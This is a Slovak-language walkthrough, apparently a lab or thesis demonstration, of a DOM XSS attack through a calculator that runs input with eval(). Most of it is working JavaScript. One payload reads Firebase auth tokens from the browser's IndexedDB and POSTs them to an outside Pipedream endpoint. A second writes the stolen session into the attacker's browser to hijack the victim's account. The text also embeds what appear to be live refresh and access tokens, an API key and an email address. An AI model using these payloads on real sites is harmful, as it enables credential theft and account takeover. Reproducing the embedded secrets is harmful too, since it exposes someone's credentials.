# Document object model cross site scripting (DOM XSS)

- V tomto útoku využijeme zraniteľnú funkciu eval(), ktorá vyhodnotí akúkoľvek hodnotu, ktoré je vložená ako argument. Vie vypočítavať rôzne rovnice, preto je ideálnym riešením pre primitívnu kalkulačku.
- Každopádne tým, že vyhodnotí akúkoľvek hodnotu tak vyhodnotí aj akýkoľvek škodlivý kód, ktorý ako argument vložíme.
- Input s textom "Enter equation..." vyhodnocuje práve funkcia eval a predpokladáme, že na tomto mieste vzniká zraniteľnosť.
- Pokúsime sa o ukradnutie uživateľových dát z databázy prehliadaču. Do inputu vložíme nasledujúci kód.
    
          const request = window.indexedDB.open("firebaseLocalStorageDb");
            request.onsuccess = (event) => {
              const db = event.target.result;

              const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
              const objectStore = transaction.objectStore("firebaseLocalStorage");

              const getDataRequest = objectStore.getAll();

              getDataRequest.onsuccess = (event) => {

              const headers = new Headers();
              headers.append("Content-Type", "text/plain");

              const options = {
                method: "POST",
                headers,
                mode: "cors",
                body: JSON.stringify(event.target.result),
              };

              fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);
              }
            };
- Tento kód sprístupní lokálnu databázu indexDB prehliadača a umožní nám vytiahnúť hodnoty z databázy. Náš momentálne zaujíma tabuľka "firebaseLocalStorage", ktorú nastavuje
  externá API Firebase, ktorú používa aplikácia na autentifikáciu. Po jej vytiahnutí sa celý objekt odošle na náš vytvorený endpoint na Pipedreame (inštalácia link).
- Teraz sa môžeme odhlásiť a prihlásiť sa do lubovľného účtu, ktorý už máme vytvorený alebo si vytvoríme nový.
- Prejdeme znova na obrazovku s kalkulačkou a vložíme nasledujúci kód do rovnakého inputu.
        const request = window.indexedDB.open("firebaseLocalStorageDb");
        request.onsuccess = (event) => {
          const db = event.target.result;
  
          const transaction = db.transaction(["firebaseLocalStorage"], "readwrite");
          const objectStore = transaction.objectStore("firebaseLocalStorage");
  
          const data = {
            fbase_key:
              "firebase:authUser:AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg:[DEFAULT]",
            value: {
              uid: "RTejhfCWw0OAlHcoAj41Fy93ZJJ3",
              email: "mate@gmail.com",
              emailVerified: false,
              isAnonymous: false,
              providerData: [
                {
                  providerId: "password",
                  uid: "mate@gmail.com",
                  displayName: null,
                  email: "mate@gmail.com",
                  phoneNumber: null,
                  photoURL: null,
                },
              ],
              stsTokenManager: {
                refreshToken:
                  "AMf-vByIsfsiw-8vT6jzvFkIqMjZhSvTzJ16dCdww3w_Pk_9kwwfanAaW09W-DWc70KzKjxtp7Dq7aEPRImKkgLIHiCN4ROLsi5NBpvQrRSNGonNI-5wt_
                    9PHITM0bt5ZXSayEMzx7dRUHJdj8-lbwiflyUREJh3TUy-QLmoxyg3rY-G6B1Ff1OQPTv-VRFJGmp3GQ2dJ5Bl0hyBKiELNwcjKDTrVyRjPw",
                accessToken:
                  "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJhNjI1OTZmNTJmNTJlZDQ0MDQ5Mzk2YmU3ZGYzNGQyYzY0ZjQ1M2UiLCJ0eXAiOiJKV1QifQ
      .eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGlwbG9tb3ZrYS10ZXN0LWFwcCIsImF1ZCI6ImRpcGxvbW92a2EtdGVzdC1hcHA
      iLCJhdXRoX3RpbWUiOjE3MTE3OTA0OTYsInVzZXJfaWQiOiJSVGVqaGZDV3cwT0FsSGNvQWo0MUZ5OTNaSkozIiwic3ViIjoiUlRlamhmQ1d3ME9BbE
      hjb0FqNDFGeTkzWkpKMyIsImlhdCI6MTcxMTc5MDQ5NiwiZXhwIjoxNzExNzk0MDk2LCJlbWFpbCI6Im1hdGVAZ21haWwuY29tIiwiZW1haWxfdmVyaWZ
      pZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbIm1hdGVAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc
      3dvcmQifX0.0Mp-T84dmzTpiAdVyhl68WV2qDvTZ78IHGYca5YpBgBx4A_m_YXoJ-IYBaTl-Yp-fXYzuKN3Vff0iqkNA5nVtUcOFfG1X157DrkE80gxp6e
      7ELg2jn_N6mF1Xw-jTSaJoAAsG8f3e_wHp-cfVqWyBNrcUTABrP8Hy_bv-iyUII60PZtjiu_oo7ObVFhoPEim82rlPJDLiwpPMos7qGEBsvw4-fKQvLPkR
      wkGbCf8bKt6Pn_jThtR9JPuhU_G2SlgppA0PuuLSyO8KViFoH4XgFMi9kyX3YU8vmg7O5bDwCYemLLpvQt4KY900_qQgxS2GnX89h_V-hNu_bGqQpL9Zg",
                expirationTime: 1711794096425,
              },
              createdAt: "1711388904315",
              lastLoginAt: "1711790496471",
              apiKey: "AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg",
              appName: "[DEFAULT]",
            },
          };
  
          objectStore.clear()
  
          const addDataRequest = objectStore.add(data);
  
          addDataRequest.onsuccess = (event) => alert("Success!");
        };
- Tento kód uloží, respektíve prepíše dáta o prihlásenom používateľovi. Objekt "dáta" nahradíme novým objektom, ktorý nám došiel na Pipedream. Zo skopírovaného objektu musíme zo všetkých atribútov odstrániť úvodzovky a nechať len pri hodnotách.
- Po kliknuti klávesy "Enter" sme si do prehliadača uložili prihlasovacie údaje iného používateľa a teraz sme prihlásený pod jeho prihalsovacimi údajmi.